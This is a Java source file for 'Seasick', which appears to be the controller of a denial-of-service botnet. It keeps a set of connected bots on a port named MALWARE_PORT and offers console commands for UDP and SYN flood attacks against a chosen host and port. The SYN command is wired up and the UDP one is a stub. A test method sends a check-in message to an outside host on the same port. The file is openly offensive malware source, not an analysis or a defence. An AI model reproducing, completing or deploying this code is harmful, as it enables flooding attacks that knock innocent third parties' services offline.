package uk.tsis.seasick;

import uk.tsis.seasick.obj.Bot;
import uk.tsis.seasick.threads.BotListener;

import java.io.PrintWriter;
import java.net.Socket;
import java.util.HashSet;
import java.util.Scanner;
import java.util.Set;

/**DaWater made this, muahaha*/
public class Seasick {

    public static int MALWARE_PORT = 8008;
    public static Set<Bot> connectedBots = new HashSet<>();
    private static BotListener botListener = new BotListener();

    public static void main(String[] args){
        botListener.start();
        Scanner scanner = new Scanner(System.in);
        get(scanner);
    }

    private static void get(Scanner scanner){
        System.out.print(" @Seasick ~# ");
        String input = scanner.nextLine();
        check(input.split(" "));
    }

    @SuppressWarnings("All")
    private static void check(String[] args){
        switch (args[0].toLowerCase()){
            case "bots":{
                System.out.println(" ");
                System.out.println("Bot Joins:");
                System.out.println(" ");
                for (String x : BotListener.joinMessages){
                    System.out.println(x.replaceAll("%s", BotListener.getDate()));
                }
                System.out.println(" ");
                break;
            }

            case "help":{
                System.out.println(" ");
                System.out.println("STOP ATTACKS: stop");
                System.out.println("UDP ATTACK: udp <host> <port>");
                System.out.println("SYN ATTACK: syn <host> <port>");
                System.out.println(" ");
                break;
            }

            case "udp":{
                if (args.length == 4){
                    //todo send attack
                }else{
                    System.out.println(" ");
                    System.out.println("STOP ATTACKS: stop");
                    System.out.println("UDP ATTACK: udp <host> <port>");
                    System.out.println("SYN ATTACK: syn <host> <port>");
                    System.out.println(" ");
                }
                break;
            }

            case "syn":{
                if (args.length == 4){
                    try {
                        Bot.syn(args[1], Integer.parseInt(args[2]), Integer.parseInt(args[3]));
                    }catch (Exception e){

                    }
                }else{
                    System.out.println(" ");
                    System.out.println("STOP ATTACKS: stop");
                    System.out.println("UDP ATTACK: udp <host> <port>");
                    System.out.println("SYN ATTACK: syn <host> <port>");
                    System.out.println(" ");
                }
                break;
            }

        }
        get(new Scanner(System.in));
    }

    @SuppressWarnings("All")
    static void test() throws Exception{
        Socket socket = new Socket("root.aaronakhtar.me", 8008);
        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
        writer.write("C0nn3ct3d");
        writer.flush();
        writer.close();
        socket.close();
        System.out.println("Sent Packet");
    }

}
